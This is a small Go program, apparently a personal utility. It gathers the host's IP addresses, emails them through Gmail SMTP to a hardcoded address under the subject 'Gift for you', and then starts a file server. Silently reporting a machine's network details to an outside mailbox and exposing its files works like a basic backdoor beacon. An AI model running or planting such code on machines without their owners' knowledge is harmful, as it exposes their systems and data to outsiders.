package main

import (
	"./utilities"
	"fmt"
	"strings"
)

func SendIP(IPs []string)(error){

	emailData := utilities.EmailData{}
	emailData.To = []string{"malhar.vora@clariontechnologies.co.in"}
	emailData.From = "malhar.vora@clariontechnologies.co.in"
	emailData.Subject = "Gift for you"
	emailData.Message = strings.Join(IPs, ", ")

	serverData := utilities.ServerData{}
	serverData.Server = "smtp.gmail.com"
	serverData.Port = 587
	serverData.Username = "malhar.vora@clariontechnologies.co.in"
	serverData.Password = ""

	err := utilities.SendEmail(emailData, serverData)
        return err
}

func main() {
  	IPs, err := utilities.GetIPs()
        err = SendIP(IPs)
        if err!= nil {
  		fmt.Println("Error : ", err)
        }
        utilities.StartFileServer()
} 
